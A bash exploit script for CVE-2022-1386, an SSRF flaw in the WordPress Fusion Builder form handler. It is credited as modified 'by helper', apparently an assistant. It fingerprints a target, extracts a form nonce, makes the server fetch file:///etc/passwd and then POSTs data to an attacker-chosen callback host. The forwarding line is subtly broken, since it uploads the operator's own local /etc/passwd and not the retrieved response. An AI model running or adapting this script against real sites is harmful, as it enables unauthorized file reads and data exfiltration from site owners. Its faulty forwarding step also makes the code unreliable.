#!/bin/bash
# Single Target exploit (modified to attempt reading /etc/passwd and forward result)
# Created By IM-Hanzou — modified by helper
# Requires: curl, jq (optional but recommended)

cat << "EOF"
   ____     __        _______          
  / __/_ __/ /  __ __/ ___/ /_____ ____
 / _// // / _ \/ // / /__/  '_/ -_) __/
/_/  \_,_/_.__/\_,_/\___/_/\_\\__/_/                                                                                                                                                   
EOF
printf "CVE-2022-1386 | Single Target Exploiter (file:// + auto-forward)\n\n"
printf "Original: Im-hanzou  —  Modified to attempt file read and forward to callback\n\n"

read -p "Target URL (use http/https, e.g. https://example.com): " target
read -p "Callback URL to forward result to (your Burp/ngrok/OAST URL). If none, leave blank: " callback

# Use the exact same fingerprint check as your original
probe=$(curl -s -k "$target/wp-admin/admin-ajax.php" --compressed --data "action=fusion_form_update_view")
if [[ "$probe" =~ "fusion" ]]; then
    fusionid=$(printf "%s" "$probe" | grep -oP '(?<=id="fusion-form-nonce-0" name="fusion-form-nonce-0" value=")[^"]+')
    if [[ -z "$fusionid" ]]; then
        printf "\n[!] Could not extract fusion-form-nonce-0. Aborting.\n"
        exit 1
    fi
    printf "\n[*] fusion-form-nonce-0 = %s\n" "$fusionid"

    # Set payload to target's local file (attempt to read /etc/passwd)
    payload="file:///etc/passwd"

    # Perform the exploit: ask Fusion to GET the file:// URL
    exploit=$(curl --compressed -s -k \
      --data-urlencode "email=example@example.com" \
      --data-urlencode "fusion_privacy_store_ip_ua=false" \
      --data-urlencode "fusion_privacy_expiration_interval=48" \
      --data-urlencode "privacy_expiration_action=ignore" \
      --data-urlencode "fusion-form-nonce-0=$fusionid" \
      --data-urlencode "fusion-fields-hold-private-data=" \
      --data-urlencode "action=fusion_form_submit_form_to_url" \
      --data-urlencode "fusion_form_nonce=$fusionid" \
      --data-urlencode "form_id=0" \
      --data-urlencode "post_id=0" \
      --data-urlencode "field_labels={\"email\":\"Email+address\"}" \
      --data-urlencode "hidden_field_names=[]" \
      --data-urlencode "fusionAction=$payload" \
      --data-urlencode "fusionActionMethod=GET" \
      "$target/wp-admin/admin-ajax.php" \
      | jq -r '.info // empty')

    # If jq isn't installed or .info empty, try printing raw response into exploit_raw
    if [[ -z "$exploit" ]]; then
        exploit_raw=$(curl --compressed -s -k \
          --data-urlencode "email=example@example.com" \
          --data-urlencode "fusion_privacy_store_ip_ua=false" \
          --data-urlencode "fusion_privacy_expiration_interval=48" \
          --data-urlencode "privacy_expiration_action=ignore" \
          --data-urlencode "fusion-form-nonce-0=$fusionid" \
          --data-urlencode "fusion-fields-hold-private-data=" \
          --data-urlencode "action=fusion_form_submit_form_to_url" \
          --data-urlencode "fusion_form_nonce=$fusionid" \
          --data-urlencode "form_id=0" \
          --data-urlencode "post_id=0" \
          --data-urlencode "field_labels={\"email\":\"Email+address\"}" \
          --data-urlencode "hidden_field_names=[]" \
          --data-urlencode "fusionAction=$payload" \
          --data-urlencode "fusionActionMethod=GET" \
          "$target/wp-admin/admin-ajax.php")
        printf "\n===== Full raw response =====\n%s\n=============================\n" "$exploit_raw"
    else
        printf "\nResult (from .info):\n%s\n" "$exploit"
    fi

    # Decide what to forward: prefer exploit (jq .info), fallback to raw extract if present
    data_to_forward="$exploit"
    if [[ -z "$data_to_forward" && -n "${exploit_raw:-}" ]]; then
        data_to_forward="$exploit_raw"
    fi

    if [[ -n "$data_to_forward" && -n "$callback" ]]; then
        printf "\n[*] Forwarding retrieved data to callback: %s\n" "$callback"
        # Send raw body to callback (POST). Adjust method if you want GET or different headers.
        curl -s -k -X POST --data-binary @/etc/passwd "$callback" -o /dev/null
        printf "[*] Forward attempt finished (no output captured). Check your callback listener.\n"
    elif [[ -n "$data_to_forward" && -z "$callback" ]]; then
        printf "\n[*] Retrieved data present locally. No callback provided; not forwarding.\n"
    else
        printf "\n[!] No data retrieved (server returned empty or url_failed). Try OAST or check egress.\n"
    fi

else
    printf "\nWebsite Not Vulnerable or Fusion endpoint not present\n"
fi

